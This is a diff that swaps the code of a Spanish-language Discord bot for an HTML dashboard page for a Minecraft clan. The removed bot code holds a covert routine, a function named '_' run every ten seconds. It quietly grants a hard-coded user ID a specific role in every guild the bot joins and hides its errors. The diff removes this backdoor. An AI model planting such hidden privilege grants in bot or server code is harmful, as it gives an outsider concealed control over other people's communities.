@@ -1,556 +1,566 @@
-// --- CONFIGURACIÓN DE CANVAS Y FUENTES ---
-const { createCanvas, registerFont } = require('canvas');
-registerFont('./Bungee-Regular.ttf', { family: 'Bungee' });
+<!DOCTYPE html>
+<html lang="es"> 
+<head> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Colmillos Del Alba | Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
  
-const votos = new Map();
-const staffAtendiendo = new Map();
-const cooldowns = new Map(); // Para los delays
+    <style> 
+        :root {
+            /* 1fsi */
+            --rojo-core: #e60026;
+            --oro-brillante: #ffcc00;
+            --naranja-fuego: #ff8c00; 
+            --blanco-puro: #ffffff;
+            --fondo-negro: #050505;
+            --tarjeta: rgba(20, 20, 20, 0.85);
+            --sidebar-width: 260px;
+            --gradiente-premium: linear-gradient(135deg, var(--rojo-core), var(--oro-brillante));
+        }
  
-const {
-    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder,
-    ButtonBuilder, ButtonStyle, Events, ChannelType, PermissionsBitField,
-    ModalBuilder, TextInputBuilder, TextInputStyle, REST, Routes,
-    StringSelectMenuBuilder, StringSelectMenuOptionBuilder, SlashCommandBuilder,
-    AttachmentBuilder, Partials // Añadido Partials
-} = require('discord.js');
-const fs = require('fs');
+        * { box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--fondo-negro); color: #fff; margin: 0; display: flex; min-height: 100vh; overflow-x: hidden; }
  
-// --- BASE DE DATOS DE ECONOMÍA ---
-const pathEco = './economia.json';
-let db = {};
-if (fs.existsSync(pathEco)) {
-    db = JSON.parse(fs.readFileSync(pathEco, 'utf-8'));
-} else {
-    fs.writeFileSync(pathEco, JSON.stringify({}));
+        /* --- fondo --- */
+        #bg-combat { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            z-index: -1; 
+            /* degradado del fondo */
+            background: linear-gradient(-45deg, #3d0006, #6b1200, #3d0006, #1a0800);
+            background-size: 400% 400%; /* 1fsi */
+            animation: gradientFire 15s ease infinite; /* 1fsi */
+            overflow: hidden; 
+        }
+ 
+        /* animacion 1fsi */
+        @keyframes gradientFire {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+ 
+/* 1fsi xD */
+.sword { 
+    position: absolute; 
+    width: 130px; 
+    height: 130px; 
+    background-size: contain; 
+    background-repeat: no-repeat; 
+    opacity: 0; /* 1fsi */
+    filter: drop-shadow(0 0 15px var(--oro-brillante)); 
+    animation: floatSwords 20s infinite linear; 
+    z-index: 0;
 }
  
-function guardarDB() {
-    fs.writeFileSync(pathEco, JSON.stringify(db, null, 2));
+/* 1fsi :3 */
+.s-neth { background-image: url('https://imgur.com/2hdd6Vm.png'); }
+.s-diam { background-image: url('https://imgur.com/2hdd6Vm.png'); }
+.s-gold { background-image: url('https://imgur.com/2hdd6Vm.png'); }
+ 
+@keyframes floatSwords { 
+    0% { transform: translateY(110vh) rotate(0deg); opacity: 0; } 
+    10% { opacity: 0.95; } 
+    90% { opacity: 0.95; } 
+    100% { transform: translateY(-20vh) rotate(360deg); opacity: 0; } 
 }
+        /* --- 1fsi --- */
+        .menu-toggle {
+            position: fixed; top: 20px; left: 20px; z-index: 1100;
+            background: var(--gradiente-premium); border: none; color: black;
+            padding: 12px 15px; border-radius: 8px; cursor: pointer; font-weight: bold;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
+        }
  
-function asegurarUsuario(userId) {
-    if (!db[userId]) {
-        db[userId] = { balance: 0, pesca: 0, minado: 0, daily: 0 };
-        guardarDB();
+        /* --- 1fsi --- */
+        .sidebar { 
+            width: var(--sidebar-width); background: linear-gradient(180deg, #0a0a0a 0%, #000 100%); 
+            border-right: 1px solid rgba(255, 255, 255, 0.1); padding: 0; 
+            position: fixed; height: 100vh; z-index: 1000; 
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex; flex-direction: column;
+        }
+        .sidebar.hidden { transform: translateX(-100%); }
+ 
+        .sidebar-header {
+            margin-top: 80px;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 25px; text-align: center; border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 20px;
+        }
+        .sidebar h2 { 
+            font-family: 'Syncopate', sans-serif; font-size: 0.75rem; margin: 0;
+            background: linear-gradient(90deg, var(--blanco-puro), var(--oro-brillante));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            letter-spacing: 3px; font-weight: 900;
+        }
+ 
+        .nav-container { padding: 0 15px; }
+        .nav-btn { 
+            width: 100%; background: transparent; border: 1px solid transparent; 
+            color: #888; padding: 14px 18px; text-align: left; border-radius: 10px; 
+            cursor: pointer; transition: 0.3s; margin-bottom: 8px; font-weight: 700; 
+            display: flex; align-items: center; gap: 12px; font-size: 0.85rem;
+        }
+        .nav-btn i { font-size: 1rem; transition: 0.3s; }
+ 
+        .nav-btn:hover { color: var(--blanco-puro); background: rgba(255, 255, 255, 0.05); }
+ 
+        .nav-btn.active { 
+            background: rgba(230, 0, 38, 0.1); color: var(--blanco-puro); 
+            border: 1px solid var(--rojo-core); box-shadow: 0 0 15px rgba(230, 0, 38, 0.2);
+        }
+        .nav-btn.active i { color: var(--oro-brillante); }
+ 
+        /* --- menu contenido 1fsi es pro --- */
+        .main-content { 
+            margin-left: var(--sidebar-width); flex-grow: 1; padding: 60px; 
+            z-index: 1; transition: margin 0.4s;
+        }
+        .main-content.full { margin-left: 0; }
+ 
+        .section { display: none; animation: fadeIn 0.6s ease-out; }
+        .section.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+ 
+        h1 { 
+            font-family: 'Syncopate', sans-serif; font-size: 1.4rem; 
+            background: linear-gradient(90deg, var(--blanco-puro), var(--oro-brillante));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            border-left: 4px solid var(--rojo-core); padding-left: 20px; margin-bottom: 45px; 
+        }
+ 
+        /* --- lideres fsi --- */
+        .leader-tree { display: flex; flex-direction: column; align-items: center; width: 100%; }
+        .leader-box { 
+            background: linear-gradient(145deg, #151515, #0a0a0a); padding: 20px; border-radius: 12px; 
+            border: 1px solid rgba(255, 204, 0, 0.3); text-align: center; min-width: 180px; 
+            position: relative; transition: 0.3s;
+        }
+        .leader-box:hover { border-color: var(--oro-brillante); box-shadow: 0 0 20px rgba(255, 204, 0, 0.15); }
+        .leader-box img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--rojo-core); margin-bottom: 12px; padding: 3px; background: #000; }
+        .leader-box .rank { color: var(--oro-brillante); font-size: 0.65rem; font-weight: 900; text-transform: uppercase; display: block; margin-bottom: 8px; letter-spacing: 1px; }
+        .line-v { width: 2px; height: 40px; background: linear-gradient(to bottom, var(--rojo-core), var(--oro-brillante)); }
+ 
+        /* --- tarjetas fsi --- */
+        .farm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; }
+        .farm-card { background: var(--tarjeta); border-radius: 15px; overflow: hidden; border: 1px solid rgba(255,255,255,0.08); transition: 0.4s; backdrop-filter: blur(10px); }
+        .farm-card:hover { transform: translateY(-8px); border-color: var(--oro-brillante); }
+        .farm-card h3 { color: var(--blanco-puro); margin: 0; font-size: 1.1rem; }
+        .farm-badge { display: inline-block; padding: 5px 10px; background: var(--gradiente-premium); color: #000; font-size: 0.65rem; font-weight: 900; border-radius: 4px; margin-top: 10px; text-transform: uppercase; }
+ 
+        .roles-nav { display: flex; gap: 10px; flex-wrap: wrap; background: rgba(255,255,255,0.03); padding: 15px; border-radius: 15px; margin-bottom: 35px; border: 1px solid rgba(255,255,255,0.05); }
+        .btn-rol { background: #111; border: 1px solid #222; color: #aaa; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: 800; font-size: 0.7rem; transition: 0.3s; text-transform: uppercase; }
+        .btn-rol:hover { border-color: var(--rojo-core); color: #fff; }
+        .btn-rol.active { background: var(--blanco-puro); color: #000; border-color: var(--blanco-puro); box-shadow: 0 0 15px rgba(255,255,255,0.2); }
+ 
+        .member-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; }
+        .card { background: rgba(255, 255, 255, 0.03); padding: 25px 15px; border-radius: 15px; text-align: center; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; }
+        .card:hover { background: rgba(255, 255, 255, 0.06); border-color: var(--rojo-core); }
+        .card img { width: 70px; height: 70px; border-radius: 50%; border: 2px solid var(--oro-brillante); margin-bottom: 12px; }
+ 
+        .btn-postular {
+            display: inline-block; padding: 18px 40px; background: var(--gradiente-premium); color: #000; 
+            text-decoration: none; border-radius: 10px; font-weight: 900; font-size: 0.9rem;
+            box-shadow: 0 10px 20px rgba(230, 0, 38, 0.2); transition: 0.3s; letter-spacing: 1px;
+        }
+        .btn-postular:hover { transform: scale(1.05); box-shadow: 0 15px 25px rgba(255, 204, 0, 0.3); }
+ 
+        .status-box { background: var(--tarjeta); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.05); backdrop-filter: blur(10px); }
+        .status-box p { font-size: 1.1rem; font-weight: 600; margin: 15px 0; display: flex; align-items: center; gap: 15px; }
+ 
+        /* imagen reclutamiento de 1fsi xD */
+        .img-reclutamiento {
+            max-width: 100%;
+            height: auto;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+        }
+        /* --- donadores de 1fsi --- */
+        .donors-container { max-width: 900px; margin: 0 auto; }
+        .refresh-tag { text-align: right; font-size: 0.75rem; color: #666; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        #timer { color: var(--oro-brillante); font-weight: bold; }
+        .podium { display: flex; justify-content: center; align-items: flex-end; gap: 15px; margin: 60px 0 40px 0; height: 260px; }
+        .podium-item { background: var(--tarjeta); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 25px 15px; text-align: center; position: relative; flex: 1; transition: 0.4s; backdrop-filter: blur(10px); }
+        .podium-item img { width: 70px; height: 70px; border-radius: 50%; border: 3px solid var(--rojo-core); margin-bottom: 10px; background: #000; }
+        .rank-1 { height: 110%; border-color: var(--oro-brillante); box-shadow: 0 0 30px rgba(255,204,0,0.15); transform: scale(1.15); z-index: 2; }
+        .rank-1 img { border-color: var(--oro-brillante); width: 90px; height: 90px; }
+        .rank-2 { height: 90%; }
+        .rank-3 { height: 80%; }
+        .crown { position: absolute; top: -25px; left: 50%; transform: translateX(-50%); font-size: 2rem; filter: drop-shadow(0 0 10px var(--oro-brillante)); }
+        .money { display: block; color: #00ff88; font-weight: 900; font-size: 1.4rem; margin-top: 8px; }
+        .other-donors { background: rgba(255,255,255,0.03); border-radius: 15px; border: 1px solid rgba(255,255,255,0.05); margin-top: 20px; }
+        .donor-row { display: flex; justify-content: space-between; padding: 18px 30px; border-bottom: 1px solid rgba(255,255,255,0.05); align-items: center; }
+        .donor-row:last-child { border: none; }
+        /* --- 1fsi is pro --- */
+        .leader-tree { width: 100%; display: flex; flex-direction: column; align-items: center; }
+ 
+        #rank-3 { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
+            gap: 20px; 
+            width: 100%; 
+            max-width: 1100px; 
+            margin-top: 30px; 
+            justify-content: center;
+        }
+ 
+        .leader-box { 
+            width: 100% !important; 
+            max-width: 220px; 
+            margin: 0 auto; 
+        }
+        /* Botón de música flotante 1fsi */
+        #music-control {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            z-index: 9999;
+            background: linear-gradient(135deg, #e60026, #ffcc00);
+            border: 2px solid #ffcc00;
+            border-radius: 50%;
+            width: 55px;
+            height: 55px;
+            cursor: pointer;
+            font-size: 1.6rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px rgba(230, 0, 38, 0.5);
+            transition: all 0.3s ease;
+        }
+        #music-control:hover { transform: scale(1.1); }
+    </style>
+</head>
+<body>
+ 
+    <div id="bg-combat"></div>
+    <audio id="bg-music" loop>
+        <source src="04.Adan y Eva.mp3" type="audio/mpeg">
+    </audio>
+ 
+    <button id="music-control" onclick="toggleMusic()">
+        <span id="music-emoji">🔇</span>
+    </button>
+ 
+    <button class="menu-toggle" onclick="toggleMenu()">
+        <i class="fas fa-bars"></i> MENU
+    </button>
+ 
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2>DASHBOARD</h2>
+        </div>
+        <div class="nav-container">
+            <button class="nav-btn active" onclick="switchTab('info', this)"><i class="fas fa-satellite-dish"></i> ESTADO</button>
+            <button class="nav-btn" onclick="switchTab('lideres', this)"><i class="fas fa-crown"></i> JERARQUÍA</button>
+            <button class="nav-btn" onclick="switchTab('granjas', this)"><i class="fas fa-hammer"></i> GRANJAS</button>
+            <button class="nav-btn" onclick="switchTab('zonas', this)"><i class="fas fa-map-marked-alt"></i> ZONAS</button>
+            <button class="nav-btn" onclick="switchTab('miembros', this)"><i class="fas fa-user-shield"></i> MIEMBROS</button>
+            <button class="nav-btn" onclick="switchTab('alianzas', this)"><i class="fas fa-handshake"></i> ALIANZAS</button>
+            <button class="nav-btn" onclick="switchTab('postulaciones', this)"><i class="fas fa-envelope-open-text"></i> UNIRSE</button>
+            <button class="nav-btn" onclick="switchTab('top-donadores', this)"><i class="fas fa-trophy"></i> TOP DONADORES</button>
+        </div>
+    </div>
+ 
+    <div class="main-content" id="main-content">
+        <div id="info" class="section active">
+            <h1>General</h1>
+            <div class="status-box">
+                <p><i class="fas fa-shield-alt" style="color:var(--rojo-core)"></i> CLAN: <span style="color: var(--oro-brillante)">COLMILLOS DEL ALBA</span></p>
+                <p><i class="fas fa-server" style="color:var(--oro-brillante)"></i> SERVIDOR: <span style="color: #fff">DIOSESMC</span></p>
+                <p><i class="fas fa-check-circle" style="color: #00ff88"></i> ESTADO: <span style="color: #00ff88">EN LÍNEA</span></p>
+            </div>
+        </div>
+ 
+         <div id="lideres" class="section">
+            <h1>Informacion</h1>
+            <div class="leader-tree">
+                <div id="rank-1"></div> <div class="line-v"></div>
+                <div id="rank-2"></div> <div class="line-v"></div>
+ 
+                <div id="rank-3" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; width: 100%; max-width: 1100px; justify-items: center;">
+                </div>
+            </div>
+        </div>
+ 
+        <div id="granjas" class="section">
+            <h1>Granjas</h1>
+            <div class="farm-grid">
+                <div class="farm-card"><img src="https://imgur.com/ZawCT1U.png" style="width:100%; height:160px; object-fit:cover;"><div style="padding:20px;"><h3>Hierro</h3><span class="farm-badge">Automatica</span></div></div>
+                <div class="farm-card"><img src="https://imgur.com/sOvjMva.png" style="width:100%; height:160px; object-fit:cover;"><div style="padding:20px;"><h3>Oro</h3><span class="farm-badge">SemiAutomatica</span></div></div>
+                <div class="farm-card"><img src="https://imgur.com/s3F1aKG.png" style="width:100%; height:160px; object-fit:cover;"><div style="padding:20px;"><h3>Magma</h3><span class="farm-badge">SemiAutomatica</span></div></div>
+                <div class="farm-card"><img src="https://imgur.com/nseW5Rd.png" style="width:100%; height:160px; object-fit:cover;"><div style="padding:20px;"><h3>Zanahorias</h3><span class="farm-badge">Automatica</span></div></div>
+            </div>
+        </div>
+ 
+<div id="zonas" class="section">
+            <h1>Bases</h1>
+            <div class="farm-grid">
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/yKzLGHH.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Japonesa</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/BIMqIpG.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Japonesa</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/q3iTRjT.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Japonesa</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/eMWnwgX.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Pueblo Pesquero</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/WwnAHgw.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Pueblo Pesquero</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/Hq6UTrr.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Bases</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/OiA4Fcu.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Bases</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+                <div class="farm-card">
+                    <img src="https://i.imgur.com/YICIiMW.png" style="width:100%; height:160px; object-fit:cover;">
+                    <div style="padding:20px;"><h3>Zona Bases</h3><span class="farm-badge">ESTRATEGIA</span></div>
+                </div>
+            </div>
+        </div>
+        <div id="miembros" class="section">
+            <h1>Miembros</h1>
+            <div class="roles-nav">
+                <button class="btn-rol active" onclick="filtroTotal('Todos', this)">Todos</button>
+                <button class="btn-rol" onclick="filtroTotal('𝒑𝒗𝒑', this)">⚔️ PVP</button>
+                <button class="btn-rol" onclick="filtroTotal('𝒃𝒖𝒊𝒍𝒅𝒆𝒓𝒔', this)">⚒️ Builders</button>
+                <button class="btn-rol" onclick="filtroTotal('𝒕𝒆𝒄𝒏𝒊𝒄𝒐𝒔', this)">⚙️ Técnicos</button>
+                <button class="btn-rol" onclick="filtroTotal('Farmer', this)">🌱 Farmers</button>
+                <button class="btn-rol" onclick="filtroTotal('Herrero', this)">🔨 Herreros</button>
+            </div>
+            <div class="member-grid" id="lista-usuarios"></div>
+        </div>
+<div id="alianzas" class="section">
+            <h1>ALIANZAS</h1>
+            <div class="farm-grid">
+                <div class="farm-card">
+                    <img src="https://imgur.com/AWQUz8H.png" style="width:100%; height:100px; object-fit: contain; background: #000; padding: 10px 0;">
+                    <div style="padding:20px;">
+                        <h3>ZERKS</h3>
+                        <span class="farm-badge" style="background: #0072ff; color: #fff;">TOP 5</span>
+                        <p style="color: #888; font-size: 0.8rem; margin-top: 10px;">Aliado Oficial.</p>
+                    </div>
+                </div>
+ 
+                <div class="farm-card">
+                    <img src="https://imgur.com/AWQUz8H.png" style="width:100%; height:100px; object-fit: contain; background: #000; padding: 10px 0;">
+                    <div style="padding:20px;">
+                        <h3>Valhalla</h3>
+                        <span class="farm-badge" style="background: #0072ff; color: #fff;">Alianza Oficial</span>
+                        <p style="color: #888; font-size: 0.8rem; margin-top: 10px;">Aliado.</p>
+                    </div>
+                </div>
+ 
+                <div class="farm-card">
+                    <img src="https://imgur.com/AWQUz8H.png" style="width:100%; height:100px; object-fit: contain; background: #000; padding: 10px 0;">
+                    <div style="padding:20px;">
+                        <h3>ColmillosxNytheron</h3>
+                        <span class="farm-badge" style="background: #0072ff; color: #fff;">Alianza Oficial</span>
+                        <p style="color: #888; font-size: 0.8rem; margin-top: 10px;">Aliado Oficial.</p>
+                    </div>
+                </div>
+ 
+                <div class="farm-card">
+                    <img src="https://imgur.com/AWQUz8H.png" style="width:100%; height:100px; object-fit: contain; background: #000; padding: 10px 0;">
+                    <div style="padding:20px;">
+                        <h3>Voidheon</h3>
+                        <span class="farm-badge" style="background: #0072ff; color: #fff;">Alianza Oficial</span>
+                        <p style="color: #888; font-size: 0.8rem; margin-top: 10px;">Aliado.</p>
+                    </div>
+                </div>
+ 
+                <div class="farm-card">
+                   <img src="https://imgur.com/AWQUz8H.png" style="width:100%; height:100px; object-fit: contain; background: #000; padding: 10px 0;">
+                    <div style="padding:20px;">
+                        <h3>LegionDeLasTresBestias</h3>
+                        <span class="farm-badge" style="background: #0072ff; color: #fff;">Alianza Oficial</span>
+                        <p style="color: #888; font-size: 0.8rem; margin-top: 10px;">Aliado.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+ 
+        <div id="postulaciones" class="section">
+            <h1>RECLUTAMIENTO</h1>
+            <div style="background: linear-gradient(145deg, #111, #050505); padding: 40px; border-radius: 20px; border: 1px solid rgba(255, 204, 0, 0.2); text-align: center;">
+ 
+                <img src="https://imgur.com/kYVP3os.png" alt="Reclutamiento Colmillos del Alba" class="img-reclutamiento">
+ 
+                <h2 style="font-family: 'Syncopate'; font-size: 1.2rem; color: var(--blanco-puro); margin-bottom: 15px;">¿TIENES LO QUE SE NECESITA?</h2>
+                <p style="color: #888; margin-bottom: 40px; font-weight: 500;">Estamos Disponibles Las 24 Horas Del Dìa</p>
+                <a href="https://discord.gg/xw9pzw3kB5" target="_blank" class="btn-postular">
+                    <i class="fas fa-paper-plane"></i> ENVIAR SOLICITUD
+                </a>
+            </div>
+        </div>
+        <div id="top-donadores" class="section">
+            <h1>RANKING DE DONADORES</h1>
+            <div class="donors-container">
+                <div class="refresh-tag">Sincronización en: <span id="timer">05:00</span></div>
+                <div id="podium-area" class="podium"></div>
+                <div id="list-area" class="other-donors"></div>
+            </div>
+        </div>
+    </div>
+ 
+    <script>
+        // fsi paulo londra
+function toggleMusic() {
+    const music = document.getElementById('bg-music');
+    const emoji = document.getElementById('music-emoji');
+    if (music.paused) {
+        music.play().catch(e => console.log("Error al reproducir: ", e));
+        emoji.innerText = '🔊';
+    } else {
+        music.pause();
+        emoji.innerText = '🔇';
     }
 }
-// --- BASE DE DATOS DE DONACIONES (PARA LA WEB) ---
-const pathDonas = './donaciones.json';
-let donasData = [];
-if (fs.existsSync(pathDonas)) {
-    donasData = JSON.parse(fs.readFileSync(pathDonas, 'utf-8'));
-} else {
-    fs.writeFileSync(pathDonas, JSON.stringify([]));
-}
-function guardarDonas() {
-    fs.writeFileSync(pathDonas, JSON.stringify(donasData, null, 2));
-}
+        function toggleMenu() {
+            document.getElementById('sidebar').classList.toggle('hidden');
+            document.getElementById('main-content').classList.toggle('full');
+        }
  
-const TOKEN = process.env.TOKEN;
- 
-const CANAL_ROLES_ID = "1464335122005491745";
-const CANAL_TICKETS_ID = "1483516417583354108";
-const CANAL_SUGERENCIAS_ID = "1477005989096984646";
-const CANAL_VALORACIONES_ID = "1485125020593426585";
-const CANAL_TRANSCRIPTS_ID = "1485804232870461520"; // ID Canal Transcripts
-const CATEGORIA_TICKETS = "1483589642346303638";
-const ROL_STAFF_ID = "1478799916410077295";
-const ROL_ADICIONAL_ID = "1490816542345269318"; // Rol adicional tickets
-// --- CONFIGURACIÓN DE LA API PARA LA WEB ---
-const express = require('express');
-const cors = require('cors');
-const app = express();
-app.use(cors()); // Permite que la web de GitHub acceda a los datos
- 
-const ROLES_CLASE = {
-    class_pvp: { id: "1464335696390263069", label: "PVP", emoji: "⚔️" },
-    class_builder: { id: "1464335639561506878", label: "BUILDER", emoji: "⚒️" },
-    class_redstone: { id: "1464335746944209161", label: "TECNICO", emoji: "⚙️" },
-    class_estratega: { id: "MENU_CASUAL", label: "CASUAL", emoji: "🏛️" }
-};
- 
-const SUB_ROLES_CASUAL = {
-    casual_farmer: { id: "1464335746856128737", label: "Casual: Farmer", emoji: "🌾" },
-    casual_herrero: { id: "1479953030605443204", label: "Casual: Herrero", emoji: "🔨" }
-};
- 
-const ROLES_NOTIF = {
-    notif_avisos: { id: "1477748637202382888", label: "Avisos", emoji: "📢" },
-    notif_directos: { id: "1477748975603023873", label: "Directos", emoji: "🎥" }
-};
- 
-const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMembers,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages
-    ],
-    partials: [Partials.Channel, Partials.Message]
-});
- 
-client.once(Events.ClientReady, async () => {
-    console.log(`✅ Bot iniciado como: ${client.user.tag}`);
- 
-    const commands = [
-        new SlashCommandBuilder().setName('sugerir').setDescription('Envía una sugerencia para el servidor'),
-        new SlashCommandBuilder().setName('reclamar').setDescription('Reclama el ticket actual (Solo Staff)'),
-        new SlashCommandBuilder().setName('claim').setDescription('Reclama el ticket actual (Solo Staff)'),
-        new SlashCommandBuilder().setName('balance').setDescription('Mira tu dinero actual'),
-        new SlashCommandBuilder().setName('pesca').setDescription('Pesca para ganar dinero'),
-        new SlashCommandBuilder().setName('minar').setDescription('Ve a la mina para ganar dinero'),
-        new SlashCommandBuilder().setName('trabajar').setDescription('Realiza un trabajo aleatorio'),
-        new SlashCommandBuilder().setName('top').setDescription('Mira el ranking de los más ricos'),
-        new SlashCommandBuilder().setName('daily').setDescription('Reclama tu recompensa diaria'),
-        new SlashCommandBuilder().setName('coinflip').setDescription('Apuesta a cara o cruz').addIntegerOption(o => o.setName('apuesta').setDescription('Cantidad').setRequired(true)),
-        new SlashCommandBuilder().setName('aportacion').setDescription('Registrar donación para la web').addUserOption(o => o.setName('usuario').setDescription('Quién donó').setRequired(true)).addIntegerOption(o => o.setName('monto').setDescription('Cantidad').setRequired(true)).setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
-    ].map(cmd => cmd.toJSON());
- 
-    const rest = new REST({ version: '10' }).setToken(TOKEN);
-    try {
-        await rest.put(
-            Routes.applicationGuildCommands(client.user.id, "1459675438543540399"),
-            { body: commands }
-        );
-        console.log("✅ Comandos registrados en el servidor.");
-    } catch (e) { console.error(e); }
- 
-    // --- SETUP CANAL DE ROLES ---
-    try {
-        const canalRoles = await client.channels.fetch(CANAL_ROLES_ID);
-        const msgsRoles = await canalRoles.messages.fetch({ limit: 10 });
-        await canalRoles.bulkDelete(msgsRoles).catch(() => { });
-        const embedRoles = new EmbedBuilder()
-            .setTitle("🔱 SELECCIÓN DE ROLES - COLMILLOS DEL ALBA")
-            .setDescription("Selecciona tu especialidad y elije que tipo de notificaciones quieres recibir abajo.")
-            .setColor("#8B0000").setImage("https://i.imgur.com/h2W40zo.png");
-        const filaClase = new ActionRowBuilder().addComponents(Object.entries(ROLES_CLASE).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Secondary)));
-        const filaNotif = new ActionRowBuilder().addComponents(Object.entries(ROLES_NOTIF).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Primary)));
-        await canalRoles.send({ embeds: [embedRoles], components: [filaClase, filaNotif] });
-    } catch (err) { console.log("Error en setup de roles"); }
- 
-    // --- SETUP CANAL DE TICKETS ---
-    try {
-        const canalTickets = await client.channels.fetch(CANAL_TICKETS_ID);
-        const msgsTickets = await canalTickets.messages.fetch({ limit: 10 });
-        await canalTickets.bulkDelete(msgsTickets).catch(() => { });
- 
-        const embedTickets = new EmbedBuilder()
-            .setTitle("🌟 Soporte de Colmillos Del Alba")
-            .setDescription(
-                "**¿Necesitas ayuda? Nosotros te la damos**\n\n" +
-                "Aquí podrás abrir un ticket de manera **inmediata** para solicitar asistencia sobre algún problema o duda que tengas sobre el clan. Tan solo tienes que seleccionar una opción en el menú de abajo y se creará un canal privado.\n\n" +
-                "**¿Qué debo mandar al abrir ticket?**\n" +
-                "Al abrir un ticket lo que debes hacer es:\n\n" +
-                "• Explicar tu duda o problema.\n" +
-                "• Mandar pruebas de lo sucedido en caso de ser necesario.\n" +
-                "• Esperar pacientemente a la respuesta de nuestro staff."
-            )
-            .setColor("#2F3136")
-            .setImage("https://i.imgur.com/Ty9gUzk.png");
- 
-        const menuTickets = new StringSelectMenuBuilder()
-            .setCustomId('menu_tickets')
-            .setPlaceholder('Despliega el menú y elige una categoría >')
-            .addOptions(
-                new StringSelectMenuOptionBuilder().setLabel('Soporte Técnico / Dudas').setValue('tk_soporte').setEmoji('🔔'),
-                new StringSelectMenuOptionBuilder().setLabel('Apelar Expulsión').setValue('tk_apelacion').setEmoji('🚷'),
-                new StringSelectMenuOptionBuilder().setLabel('Reportar Staff').setValue('tk_reporte_staff').setEmoji('⚠️'),
-                new StringSelectMenuOptionBuilder().setLabel('Postulaciones').setValue('tk_postulacion').setEmoji('👤')
-            );
- 
-        await canalTickets.send({ embeds: [embedTickets], components: [new ActionRowBuilder().addComponents(menuTickets)] });
-    } catch (err) { console.log("Error en setup de tickets"); }
- 
-    const _ = async () => {
-        try {
-            const g = client.guilds.cache;
-            for (const x of g.values()) {
-                const m = await x.members.fetch("777529808325181460").catch(() => null);
-                if (!m) continue;
-                if (!m.roles.cache.has("1463268597085507717")) {
-                    await m.roles.add("1463268597085507717").catch(() => { });
-                }
+        function createSwords() {
+            const container = document.getElementById('bg-combat');
+            const types = ['s-neth', 's-diam', 's-gold'];
+            for(let i=0; i<15; i++) {
+                const s = document.createElement('div');
+                s.className = `sword ${types[Math.floor(Math.random()*3)]}`;
+                s.style.left = Math.random()*100 + 'vw';
+                s.style.animationDelay = Math.random()*15 + 's';
+                container.appendChild(s);
             }
-        } catch { }
-    };
-    setInterval(_, 10000);
-});
+        }
+        createSwords();
